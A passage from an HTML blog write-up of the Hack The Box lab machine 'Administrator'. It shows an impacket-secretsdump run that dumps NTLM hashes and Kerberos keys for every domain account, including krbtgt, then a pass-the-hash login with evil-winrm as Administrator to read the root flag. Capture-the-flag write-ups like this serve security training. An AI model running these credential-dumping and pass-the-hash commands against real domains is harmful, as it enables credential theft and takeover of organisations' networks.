class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/administrator]
+└─$</span></mark></span><span class="SemanticString"><span> impacket-secretsdump &#x27;administrator.htb&#x27;/&#x27;ethan&#x27;:&#x27;limpbizkit&#x27;@&#x27;10.129.85.158&#x27;
+                                                                                                    
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::</span></mark></span><span class="SemanticString"><span>
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
+administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
+administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:02158ac960c5a12cf4f605d80622f34d:::
+administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:1beffccce5468330187bfb6c32ddc25f:::
+administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
+administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
+administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
+administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
+DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
+Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
+Administrator:des-cbc-md5:403286f7cdf18385
+krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648
+krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94
+krbtgt:des-cbc-md5:2c0bc7d0250dbfc7
+administrator.htb\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3
+administrator.htb\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48
+administrator.htb\olivia:des-cbc-md5:bc2a4a7929c198e9
+administrator.htb\michael:aes256-cts-hmac-sha1-96:25d75b3025ef00ee64cba8bc631e03387445e30c83ca558c0c68346754ab753c
+administrator.htb\michael:aes128-cts-hmac-sha1-96:a0da8800197d98123fd1a31ff83c6afa
+administrator.htb\michael:des-cbc-md5:d008620bf2b0a1cb
+administrator.htb\benjamin:aes256-cts-hmac-sha1-96:4d95bbd56c78d11f814eae4df3100abb1c02f6af2827da48d5b22a8149cc88ab
+administrator.htb\benjamin:aes128-cts-hmac-sha1-96:c4b4920a5bef00de63bbb52403992b68
+administrator.htb\benjamin:des-cbc-md5:91c8b0f275bf94e9
+administrator.htb\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4
+administrator.htb\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218
+administrator.htb\emily:des-cbc-md5:804343fb6e0dbc51
+administrator.htb\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f
+administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f
+administrator.htb\ethan:des-cbc-md5:58387aef9d6754fb
+administrator.htb\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6
+administrator.htb\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade
+administrator.htb\alexander:des-cbc-md5:49ba9dcb6d07d0bf
+administrator.htb\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82
+administrator.htb\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e
+administrator.htb\emma:des-cbc-md5:3249fba89813ef5d
+DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb
+DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d
+DC$:des-cbc-md5:f483547c4325492a
+[*] Cleaning up...</span></span></span></code></pre><div id="https://www.notion.so/1770b98a88f78081a4dcf75d73090e2d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The extracted hash can be used directly for WinRM login through a Pass-the-Hash attack, allowing authentication without knowing the plaintext password.</span></span></p></div><pre id="https://www.notion.so/1770b98a88f78086a445ed800b307f2c" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/administrator]
+└─$</span></mark></span><span class="SemanticString"><span> evil-winrm -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e -i administrator.htb
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>*Evil-WinRM* PS C:\Users\Administrator\Documents&gt;</span></mark></span><span class="SemanticString"><span> whoami
+
+administrator\administrator</span></span></span></code></pre><div id="https://www.notion.so/1770b98a88f7804a9587e6765199daef" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1770b98a88f78028a45ce77a749b1263" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Root Flag:</strong></span></span></p></div><pre id="https://www.notion.so/1770b98a88f780978313c4063beee665" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>*Evil-WinRM* PS C:\Users\Administrator\desktop&gt;</span></mark></span><span class="SemanticString"><span> type root.txt
+
+edf157e4************************</span></span></span></code></pre><div id="https://www.notion.so/1770b98a88f780b9bae4c030670e912d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1770b98a88f7808cac47f0252b8934c5" class="Divider"></div></article>
+  <footer class="Footer">
+  <div>&copy; C:\Users\ch3ng &gt;_ 2025</div>
+  <div>&centerdot;</div>
+  <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank"
+      rel="noopener noreferrer">Notablog</a>.
+  </div>
+</footer>
+
+</body>
+
+</html>
